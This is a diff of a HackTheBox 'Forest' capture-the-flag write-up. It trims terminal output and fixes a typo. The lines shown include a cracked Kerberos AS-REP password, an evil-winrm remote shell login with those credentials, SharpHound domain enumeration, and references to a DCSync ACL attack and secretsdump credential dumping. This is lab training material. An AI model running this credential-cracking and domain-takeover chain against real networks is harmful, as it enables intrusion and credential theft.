@@ -227,19 +227,9 @@ Yay! We found a hash for the user `svc-alfresco`. Lets save it to a file and run
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
-└─# cat hash.txt                                                            
-$krb5asrep$svc-alfresco@HTB.LOCAL:83eaf6df5506cbe209f4d3744cbb1735$fe1cf464a1e1f3bbc427008aa534c6ea07f89bb358102603af3d45db64968517df07f0d2914442647686ec4fa3a41d5f440a2bad6f2e73e15f002c7f83f6f930e04d10a78fd7180673e78c0c3d5e838d25a7e2f0b259a623453f3b89f9423c52eddd6ae02c788ebae6b40bec809593d5a853147b488bca96ba37ba44ce955ab5bcfc755cefcf2c4c7e92ba0a5b2d8327fb737e2bea6b9dbb2be2d8fd50a4efabb9b88544ec6db97c7893e55b128882a29ec1aa014bab005b0fb52213a76c773e37ea9355520737d840c8f28e74ca4d8bb0bdf912cd04940ae5bb034b7b601132d81244c05148
-                                                                                                                      
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
-└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt               
-Using default input encoding: UTF-8
-Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt             ...
 s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
-1g 0:00:00:04 DONE (2022-07-15 11:03) 0.2403g/s 982153p/s 982153c/s 982153C/s s4553592..s3r2s1
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
+...
 ```
 
 # Exploit
@@ -253,15 +243,7 @@ Fortunately, there is an easy way to do so using `evil-winrm`!
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
 └─# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
+...
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
 ```
 
@@ -319,18 +301,7 @@ Now, we can invoke `SharpHound` to collect the necessary data.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> ./SharpHound.exe -c all
-2022-07-14T21:52:42.3218832-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-2022-07-14T21:52:42.3218832-07:00|INFORMATION|Initializing SharpHound at 9:52 PM on 7/14/2022
-2022-07-14T21:52:42.7437613-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-2022-07-14T21:52:43.1343915-07:00|INFORMATION|Beginning LDAP search for htb.local
-2022-07-14T21:52:43.2437697-07:00|INFORMATION|Producer has finished, closing LDAP channel
-2022-07-14T21:52:43.2593849-07:00|INFORMATION|LDAP channel closed, waiting for consumers
-2022-07-14T21:53:13.8844514-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
-2022-07-14T21:53:28.1969773-07:00|INFORMATION|Consumers finished, closing output channel
-2022-07-14T21:53:28.3376031-07:00|INFORMATION|Output channel closed, waiting for output task to complete
-Closing writers
-2022-07-14T21:53:28.7594979-07:00|INFORMATION|Status: 162 objects finished (+162 3.6)/s -- Using 46 MB RAM
-2022-07-14T21:53:28.7594979-07:00|INFORMATION|Enumeration finished in 00:00:45.6230922
+...
 2022-07-14T21:53:29.1501079-07:00|INFORMATION|SharpHound Enumeration Completed at 9:53 PM on 7/14/2022! Happy Graphing!
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> dir
@@ -457,7 +428,7 @@ Upon logging in, the script will add a `DCSync` privilege to the user.
 [-] ACL attack already performed. Refusing to continue
 ```
 
-Moving on, we can run `secretsdumo.py` (also included in Kali) to dump the domain credentials.
+Moving on, we can run `secretsdump.py` (also included in Kali) to dump the domain credentials.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
